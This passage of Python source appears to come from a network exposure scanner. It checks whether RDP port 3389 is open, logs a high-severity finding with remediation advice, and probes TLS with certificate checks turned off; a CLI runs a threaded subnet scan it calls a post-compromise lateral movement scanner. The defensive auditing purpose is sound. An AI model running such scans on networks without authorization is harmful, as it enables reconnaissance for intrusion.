    # Network-level authentication (NLA) enforcement is a required control.
    # ------------------------------------------------------------------
    rdp_raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    rdp_raw.settimeout(timeout)
    try:
        rdp_raw.connect((host, 3389))
        findings.append({
            'severity': 'HIGH',
            'title': 'RDP_PORT_OPEN',
            'detail': (
                f'host={host} port=3389 protocol=TCP '
                f'note=RDP_port_open '
                f'indicator=Remote_Desktop_surface_brute_force_lateral_movement_vector '
                f'ref=CyberOps-ch04-remote-access-attacks '
                f'action=restrict_3389_to_VPN_or_jump_host_enforce_NLA_disable_legacy_RDP'
            ),
            'host': host,
            'port': 3389,
        })
        ctx = _ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = _ssl.CERT_NONE
        try:
            tls = ctx.wrap_socket(rdp_raw, server_hostname=host)
            cert = tls.getpeercert(binary_form=True)
            if findings and findings[-1]['title'] == 'RDP_PORT_OPEN':
                findings[-1]['detail'] += (
                    f' tls_negotiated=true cert_present={cert is not None}'
                )
            _close(tls)
        except (_ssl.SSLError, OSError):
            _close(rdp_raw)
    except (ConnectionRefusedError, socket.timeout):
        _close(rdp_raw)
    except Exception:
        _close(rdp_raw)

    return findings


if __name__ == '__main__':
    import argparse
    import json

    p = argparse.ArgumentParser(description='Lateral movement post-compromise scanner')
    p.add_argument('--no-network', action='store_true', help='Skip subnet scan')
    p.add_argument('--timeout', type=float, default=0.5, help='TCP probe timeout (s)')
    p.add_argument('--workers', type=int, default=100, help='Parallel scan threads')
    p.add_argument('--json', action='store_true', help='Output JSON')
    args = p.parse_args()

    scanner = LateralMovementScanner(
        scan_network=not args.no_network,
        scan_timeout=args.timeout,
        max_workers=args.workers
    )
    results = scanner.run_all()

    if args.json:
        print(json.dumps(results, default=str, indent=2))
    else:
        print(scanner.report())
